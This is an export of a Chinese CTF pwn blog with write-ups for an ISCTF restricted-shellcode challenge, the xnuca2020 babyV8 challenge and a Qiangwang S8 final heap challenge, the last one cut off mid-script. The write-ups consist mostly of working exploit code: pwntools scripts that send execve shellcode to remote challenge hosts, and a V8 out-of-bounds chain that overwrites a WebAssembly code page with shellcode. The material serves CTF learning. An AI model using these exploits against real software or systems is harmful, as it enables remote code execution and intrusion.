                     data-src="/202311/30/abstract-shellcode/2023-11-30_19-01-04.png"
                      alt="2023-11-30_19-01-04"
                ></p>
<p>第二部分，判断输入的字符是否在4E和5F之间，如果全部符合就call rax，也就是执行这段输入的shellcode</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202311/30/abstract-shellcode/2023-11-30_19-02-32-17013449788742.png"
                      alt="2023-11-30_19-02-32"
                ></p>
<p>重点来了，前面发现可以输入17个字符，但检测只检测16个字符，这里就有一个小漏洞了</p>
<p>进gdb调试，断在call rax处</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202311/30/abstract-shellcode/2023-11-30_19-20-37.png"
                      alt="2023-11-30_19-20-37"
                ></p>
<p>分析栈结构发现</p>
<p>rsp +8 刚好是第一次输入的字符的地址而前面输入则是不为”ye”的两个字符</p>
<p>分析下寄存器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202311/30/abstract-shellcode/2023-11-30_19-23-43.png"
                      alt="2023-11-30_19-23-43"
                ></p>
<p>找找用得上的东西</p>
<p>分析完后就是构造shellcode了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:  4e                      rex.WRX</span><br><span class="line">1:  4f 50                   rex.WRXB push r8</span><br><span class="line">3:  50                      push   rax</span><br><span class="line">4:  51                      push   rcx</span><br><span class="line">5:  52                      push   rdx</span><br><span class="line">6:  53                      push   rbx</span><br><span class="line">7:  54                      push   rsp</span><br><span class="line">8:  55                      push   rbp</span><br><span class="line">9:  56                      push   rsi</span><br><span class="line">a:  57                      push   rdi</span><br><span class="line">b:  58                      pop    rax</span><br><span class="line">c:  59                      pop    rcx</span><br><span class="line">d:  5a                      pop    rdx</span><br><span class="line">e:  5b                      pop    rbx</span><br><span class="line">f:  5c                      pop    rsp</span><br><span class="line">10: 5d                      pop    rbp</span><br><span class="line">11: 5e                      pop    rsi</span><br></pre></td></tr></table></figure></div>

<p>通过机器码转汇编可以发现限制的shellcode都是push和pop</p>
<p>而第十七个字符刚好不受限制，诶，刚好构建一个ret</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:  c3                      ret</span><br></pre></td></tr></table></figure></div>

<p>ret去哪呢</p>
<p>诶，第一次输入刚好是俩字符，诶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:  0f 05                   syscall</span><br></pre></td></tr></table></figure></div>

<p>syscall也是俩俩字节</p>
<p>思路已经很明显了</p>
<p>1、通过shellcode操作寄存器和栈，以达到syscall-&gt;read</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rax = <span class="number">0x0</span></span><br><span class="line">rdi = <span class="number">0x0</span></span><br><span class="line">rsi = 某处地址（位于第一次输入之后，执行完后滑到这继续执行）</span><br><span class="line">rdx = 长度（我选的是r11中的<span class="number">0x246</span>）</span><br></pre></td></tr></table></figure></div>

<p>2、构造shellcode</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:  58                      pop    rax</span><br><span class="line">1:  58                      pop    rax</span><br><span class="line">2:  5b                      pop    rbx</span><br><span class="line">3:  53                      push   rbx</span><br><span class="line">4:  5e                      pop    rsi</span><br><span class="line">5:  4f 53                   rex.WRXB push r11</span><br><span class="line">7:  5a                      pop    rdx</span><br><span class="line">8:  50                      push   rax</span><br><span class="line">9:  5f                      pop    rdi</span><br><span class="line">a:  50                      push   rax</span><br><span class="line">b:  5f                      pop    rdi</span><br><span class="line">c:  50                      push   rax</span><br><span class="line">d:  5f                      pop    rdi</span><br><span class="line">e:  50                      push   rax</span><br><span class="line">f:  53                      push   rbx</span><br><span class="line">10: c3                      ret</span><br></pre></td></tr></table></figure></div>



<p>exp</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> k:</span><br><span class="line">    p = remote(<span class="string">&#x27;43.249.195.138&#x27;</span>,<span class="string">&#x27;22251&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./abstractshellcode&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./abstractshellcode&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0x14a6)&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input:(ye / no)&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x0f\x05&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;---input your pop code---&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x90\x90\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\x58\x58\x5b\x53\x5e\x4f\x53\x5a\x50\x5f\x50\x5f\x50\x5f\x50\x53\xc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Over</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ISCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>年轻人的第一条博客</title>
    <url>/202311/30/hello-world/</url>
    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h1><p>小菜鸡的pwn之旅</p>
]]></content>
  </entry>
  <entry>
    <title>xnuca2020-babyV8</title>
    <url>/202412/03/xnuca2020-babyV8/</url>
    <content><![CDATA[<h1 id="2024-12-03-xnuca2020-babyV8"><a href="#2024-12-03-xnuca2020-babyV8" class="headerlink" title="2024&#x2F;12&#x2F;03&#x2F;xnuca2020-babyV8"></a>2024&#x2F;12&#x2F;03&#x2F;xnuca2020-babyV8</h1><h2 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h2><div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.cc</span></span><br><span class="line"><span class="comment">index 16fd384..8bf435a 100644</span></span><br><span class="line"><span class="comment">--- a/src/codegen/code-stub-assembler.cc</span></span><br><span class="line"><span class="comment">+++ b/src/codegen/code-stub-assembler.cc</span></span><br><span class="line"><span class="meta">@@ -2888,7 +2888,7 @@</span> TNode&lt;Smi&gt; CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,</span><br><span class="line">       [&amp;](TNode&lt;Object&gt; arg) &#123;</span><br><span class="line">         TryStoreArrayElement(kind, &amp;pre_bailout, elements, var_length.value(),</span><br><span class="line">                              arg);</span><br><span class="line"><span class="deletion">-        Increment(&amp;var_length);</span></span><br><span class="line"><span class="addition">+        Increment(&amp;var_length, 3);</span></span><br><span class="line">       &#125;,</span><br><span class="line">       first);</span><br><span class="line">   &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h2><h3 id="get-map"><a href="#get-map" class="headerlink" title="get map"></a>get map</h3><div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> raw_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> d_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">var</span> l_buf = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(raw_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2l</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    d_buf[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">l2d</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    l_buf[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> d_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>); <span class="comment">// length add 36</span></span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">1.2</span>];</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">d2l</span>(arr[<span class="number">18</span>]));</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>通过arr的数组越界去读arr2的map</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241202203850214.png"
                      alt="image-20241202203850214"
                ></p>
<p>arr的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241202203830080.png"
                      alt="image-20241202203830080"
                ></p>
<p>疑似读到了这里：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241202203934497.png"
                      alt="image-20241202203934497"
                ></p>
<p>想读的地方：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241202204044956.png"
                      alt="image-20241202204044956"
                ></p>
<p>好像溢出读不到（（（（</p>
<p>把arr2类型换成Int Array</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241202204528062.png"
                      alt="image-20241202204528062"
                ></p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">11</span>];</span><br><span class="line">arr2[<span class="number">1</span>] = <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;map_and_len&quot;</span>, <span class="title function_">d2l</span>(arr[<span class="number">36</span>]));</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>这样就拿到了map地址</p>
<h3 id="change-length"><a href="#change-length" class="headerlink" title="change length"></a>change length</h3><p>这样可以将arr2的长度改的非常大</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">11</span>];</span><br><span class="line">arr2[<span class="number">1</span>] = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">map = <span class="title function_">f64toi64</span>(arr[<span class="number">36</span>]);</span><br><span class="line">map_addr = <span class="title function_">u64_l</span>(arr[<span class="number">36</span>]);</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;map_and_len&quot;</span>, map);</span><br><span class="line"></span><br><span class="line">arr[<span class="number">36</span>] = <span class="title function_">p64</span>(<span class="number">40000</span>, map_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;arr2: &quot;</span>, arr2[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;arr[36]&quot;</span>, h.<span class="title function_">f64toi64</span>(arr[<span class="number">36</span>]));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241203074703248.png"
                      alt="image-20241203074703248"
                ></p>
<h3 id="shellcode！"><a href="#shellcode！" class="headerlink" title="shellcode！"></a>shellcode！</h3><div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>, <span class="number">1.2</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">11</span>];</span><br><span class="line">arr2[<span class="number">1</span>] = <span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7F</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x6D</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x8A</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">len = <span class="title function_">u64_h</span>(arr[<span class="number">36</span>]);</span><br><span class="line">map = <span class="title function_">u64_l</span>(arr[<span class="number">36</span>]);</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;len&quot;</span>, len);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;map&quot;</span>, map);</span><br><span class="line"></span><br><span class="line">arr[<span class="number">36</span>] = <span class="title function_">p64</span>(<span class="number">40000</span>, map);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;arr2: &quot;</span>, arr2[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;arr[36]&quot;</span>, <span class="title function_">f64toi64</span>(arr[<span class="number">36</span>]));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr2);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arr3);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>先创建wasm实例，然后修改arraybuffer的地址，注入shellcode</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241203074828033.png"
                      alt="image-20241203074828033"
                ></p>
<p>搜索wasm的shellcode地址</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_addr;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x31200</span>; i &lt; <span class="number">0x31500</span>; i++) &#123;</span><br><span class="line">    tmp = <span class="title function_">f64toi64</span>(arr2[i]);</span><br><span class="line">    <span class="comment">// printhex(`$&#123;hex(i)&#125;`, tmp);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(tmp) == <span class="number">0x2f6d7361772f2f3a</span>) &#123;</span><br><span class="line">        <span class="title function_">farrdump</span>(arr2, i + <span class="number">16</span>, i + <span class="number">20</span>);</span><br><span class="line">        wasm_addr = <span class="title function_">f64toi64</span>(arr2[i + <span class="number">17</span>]);</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">&quot;wasm_addr&quot;</span>, wasm_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="title function_">u64_h</span>(arr2[i]);</span><br><span class="line">    tmp_ = <span class="title function_">u64_l</span>(arr2[i + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="number">0x772f2f3a</span> &amp;&amp; tmp_ == <span class="number">0x2f6d7361</span>) &#123;</span><br><span class="line">        <span class="title function_">farrdump</span>(arr2, i + <span class="number">16</span>, i + <span class="number">20</span>);</span><br><span class="line">        wasm_l = <span class="title function_">u64_h</span>(arr2[i + <span class="number">17</span>]);</span><br><span class="line">        wasm_h = <span class="title function_">u64_l</span>(arr2[i + <span class="number">18</span>]);</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">&quot;wasm_addr_l&quot;</span>, wasm_l);</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">&quot;wasm_addr_h&quot;</span>, wasm_h);</span><br><span class="line">        wasm_addr = <span class="title function_">u64_h</span>(arr2[i + <span class="number">17</span>]) + ((<span class="title function_">u64_l</span>(arr2[i + <span class="number">18</span>]) &lt;&lt; <span class="number">32</span>));</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">&quot;wasm_addr&quot;</span>, wasm_addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注入shellcode然后执行</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">arr2[<span class="number">21</span>] = <span class="title function_">p64</span>(<span class="title class_">Number</span>(wasm_addr &amp; <span class="title class_">BigInt</span>(<span class="number">0xFFFFFFFF</span>)), <span class="number">0</span>);</span><br><span class="line">arr2[<span class="number">22</span>] = <span class="title function_">p64</span>(<span class="number">0</span>, <span class="title class_">Number</span>(wasm_addr &gt;&gt; <span class="title class_">BigInt</span>(<span class="number">32</span>)));</span><br><span class="line"><span class="title function_">farrdump</span>(arr2, <span class="number">20</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_arr = <span class="keyword">new</span> <span class="title class_">DataView</span>(arr3);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    shellcode_arr.<span class="title function_">setUint32</span>(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">func</span>();</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241203085759552.png"
                      alt="image-20241203085759552"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/03/xnuca2020-babyV8/image-20241203085728730.png"
                      alt="image-20241203085728730"
                ></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>强网S8-final-JP</title>
    <url>/202412/07/%E5%BC%BA%E7%BD%91S8-final-JP/</url>
    <content><![CDATA[<h1 id="强网S8-final-WP"><a href="#强网S8-final-WP" class="headerlink" title="强网S8 final WP"></a>强网S8 final WP</h1><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>uaf先修改aes的key</p>
<p>然后house of apple，ROP，写shellcode</p>
<p>最后orw</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 22620&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.31/libio</span></span><br><span class="line"><span class="string">    b *$rebase(0x17C9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x18B9)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1973)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1A30)</span></span><br><span class="line"><span class="string">    b wgenops.c:371</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span 